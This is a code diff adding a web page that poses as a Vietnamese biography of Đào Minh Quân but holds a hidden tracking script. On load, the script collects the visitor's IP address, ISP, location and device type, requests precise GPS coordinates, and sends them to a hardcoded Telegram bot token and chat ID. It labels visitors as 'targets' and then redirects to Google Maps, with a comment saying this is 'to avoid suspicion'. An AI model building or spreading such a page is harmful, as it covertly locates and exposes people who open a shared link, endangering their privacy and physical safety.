@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Tiểu sử Đào Minh Quân</title>
+    
+     <title>Tiểu sử Đức quốc công Đào Minh Quân</title>
+    
+    <meta property="og:title" content="Tiểu sử Đức quốc công Đào Minh Quân">
+    <meta property="og:description" content="Tội ác cộng sản với Đào Minh Quân và công ơn cao cả của Ngài.">
+    <meta property="og:image" content="https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg">
+
+    <style>
+        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .msg { margin-top: 15px; color: #777; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto;"></div>
+        <div class="msg">Đang tải...</div>
+    </div>
+
+    <script>
+        const TG_TOKEN = "8123198134:AAHTKQPxi5CnW_HDEenVJjRZMZvx1REjLB4";
+        const TG_ID = "857408205";
+        const REDIRECT = "https://www.google.com/maps";
+
+        // 1. Hàm gửi tin nhắn về Telegram
+        async function report(msg) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: "HTML" })
+                });
+            } catch (e) {}
+        }
+
+        // 2. Lấy dữ liệu IP và Vị trí gần đúng (Fallback)
+        async function getIpData() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch (e) { return null; }
+        }
+
+        // 3. Lấy tên thiết bị
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android Device";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iOS Device";
+            if (/Windows/i.test(ua)) return "Windows PC";
+            return "Unknown Device";
+        }
+
+        async function processTracking() {
+            const device = getDevice();
+            const ipData = await getIpData();
+            
+            // Thông tin cơ bản từ IP (Luôn lấy được)
+            let baseMsg = `🌐 <b>MỤC TIÊU MỚI (GITHUB)</b>\n`;
+            if (ipData) {
+                baseMsg += `📱 Thiết bị: <code>${device}</code>\n`;
+                baseMsg += `🌐 IP: <code>${ipData.ip}</code>\n`;
+                baseMsg += `🏢 Nhà mạng: <code>${ipData.org}</code>\n`;
+                baseMsg += `📍 Vị trí IP: <code>${ipData.city}, ${ipData.country_name}</code>\n`;
+            }
+
+            // Thử lấy GPS chính xác
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        let gpsMsg = baseMsg + `🎯 <b>GPS CHÍNH XÁC:</b>\n`;
+                        gpsMsg += `📍 Tọa độ: <code>${lat},${lon}</code>\n`;
+                        gpsMsg += `🔗 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem vị trí mục tiêu</a>`;
+                        await report(gpsMsg);
+                        window.location.replace(REDIRECT);
+                    },
+                    async (err) => {
+                        // Nếu mục tiêu TỪ CHỐI GPS
+                        let failMsg = baseMsg + `⚠️ <b>Mục tiêu TỪ CHỐI GPS</b>\n`;
+                        if (ipData) {
+                            failMsg += `📍 Vị trí dự phòng: <a href="https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}">Xem vùng IP</a>`;
+                        }
+                        await report(failMsg);
+                        window.location.replace(REDIRECT);
+                    },
+                    { enableHighAccuracy: true, timeout: 6000 }
+                );
+            } else {
+                await report(baseMsg + "❌ Trình duyệt không hỗ trợ GPS.");
+                window.location.replace(REDIRECT);
+            }
+
+            // Tự động chuyển hướng sau 8s để tránh nghi ngờ
+            setTimeout(() => { window.location.replace(REDIRECT); }, 8000);
+        }
+
+        window.onload = processTracking;
+    </script>
+</body>
+</html>
